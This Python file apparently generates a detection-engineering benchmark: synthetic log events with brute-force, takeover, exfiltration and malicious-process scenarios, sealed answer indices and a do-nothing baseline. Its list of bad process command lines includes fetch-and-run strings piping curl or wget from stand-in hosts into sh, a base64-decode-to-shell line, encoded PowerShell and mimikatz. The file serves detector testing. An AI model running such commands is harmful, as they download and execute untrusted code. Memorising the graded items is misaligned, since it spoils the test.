"""PX-DE1 (Board 2) detection-engineering content: a sealed per-instance log-event stream with
embedded attack scenarios and benign look-alikes. The candidate submits `detect.py` exposing
`detect(events) -> list[int]` returning the indices of events that are part of an attack.

Ground-truth malicious indices are sealed server-side (never sent to the candidate). The detection
policy is fixed and documented so grading is deterministic:

  * brute force      : 5+ `auth_fail` from the same src_ip  -> each of those auth_fail events
  * account takeover : an `auth_success` from an src_ip that had 5+ prior auth_fail -> that event
  * exfiltration     : a `data_transfer` with bytes_out >= 1_000_000 to a dest_ip OUTSIDE 10.0.0.0/8
  * malicious process: a `process` whose cmdline matches a known-bad pattern (encoded PowerShell,
                       piped curl|sh / wget|sh, base64 -d | sh, mimikatz)

Benign look-alikes (must NOT be flagged): 4 auth_fail from one IP (below threshold), a large INTERNAL
transfer, a normal auth_success, ordinary processes.
"""
from __future__ import annotations

import random
from typing import Any, Dict, List, Tuple

DETECTION_CORPUS_VERSION = "detection-soc-v1"

_INTERNAL = "10.0.%d.%d"
_EXTERNAL = ["203.0.113.%d", "198.51.100.%d", "45.77.%d.%d"]
_USERS = ["alice", "bob", "carol", "dave", "erin"]
_BENIGN_PROC = ["python app.py", "nginx -g daemon off", "git status", "node server.js", "psql -U app"]
_BAD_PROC = ["powershell -enc SQBFAFgA", "curl http://evil.example/x | sh",
             "wget -qO- http://bad.host/p | sh", "echo ZXZpbA== | base64 -d | sh", "mimikatz.exe"]


def _ext_ip(rng: random.Random) -> str:
    pat = rng.choice(_EXTERNAL)
    return pat % tuple(rng.randrange(1, 254) for _ in range(pat.count("%d")))


def generate_instance(seed: int) -> Dict[str, Any]:
    """Deterministic per-instance event stream + sealed malicious index set. Pure function of seed."""
    rng = random.Random(seed)
    items: List[Tuple[Dict[str, Any], bool]] = []
    ts = 1_700_000_000

    def ev(e, mal):
        nonlocal ts
        ts += rng.randrange(1, 30)
        e["ts"] = ts
        items.append((e, mal))

    # benign noise
    for _ in range(8):
        kind = rng.randrange(3)
        ip = _INTERNAL % (rng.randrange(1, 8), rng.randrange(2, 254))
        if kind == 0:
            ev({"type": "auth_success", "src_ip": ip, "user": rng.choice(_USERS)}, False)
        elif kind == 1:
            ev({"type": "data_transfer", "src_ip": ip, "dest_ip": _INTERNAL % (rng.randrange(1, 8), 5),
                "bytes_out": rng.randrange(1000, 50000)}, False)
        else:
            ev({"type": "process", "src_ip": ip, "user": rng.choice(_USERS),
                "cmdline": rng.choice(_BENIGN_PROC)}, False)

    # scenario 1+2: brute force then account takeover from attacker IP
    atk = _ext_ip(rng)
    victim = rng.choice(_USERS)
    for _ in range(rng.randrange(5, 9)):
        ev({"type": "auth_fail", "src_ip": atk, "user": victim}, True)
    ev({"type": "auth_success", "src_ip": atk, "user": victim}, True)   # takeover

    # scenario 3: exfiltration to external
    ev({"type": "data_transfer", "src_ip": _INTERNAL % (2, 20), "dest_ip": _ext_ip(rng),
        "bytes_out": rng.randrange(1_000_000, 50_000_000)}, True)

    # scenario 4: malicious process
    ev({"type": "process", "src_ip": _INTERNAL % (3, 30), "user": rng.choice(_USERS),
        "cmdline": rng.choice(_BAD_PROC)}, True)

    # benign look-alikes (negative controls)
    benign_ip = _ext_ip(rng)
    for _ in range(4):   # below the 5-fail brute-force threshold
        ev({"type": "auth_fail", "src_ip": benign_ip, "user": rng.choice(_USERS)}, False)
    ev({"type": "data_transfer", "src_ip": _INTERNAL % (4, 40), "dest_ip": _INTERNAL % (4, 9),
        "bytes_out": rng.randrange(2_000_000, 9_000_000)}, False)   # large but INTERNAL
    ev({"type": "process", "src_ip": _INTERNAL % (5, 50), "user": rng.choice(_USERS),
        "cmdline": rng.choice(_BENIGN_PROC)}, False)

    rng.shuffle(items)
    events = [e for e, _ in items]
    malicious = sorted(i for i, (_, m) in enumerate(items) if m)
    return {"version": DETECTION_CORPUS_VERSION, "events": events, "malicious": malicious}


# Naive baseline (the negative control): detects nothing. MUST score 0 / critical miss, proving the
# board discriminates a real detection rule set from a no-op.
NAIVE_BASELINE = (
    "def detect(events):\n"
    "    # TODO: return the indices of events that are part of an attack.\n"
    "    return []\n"
)
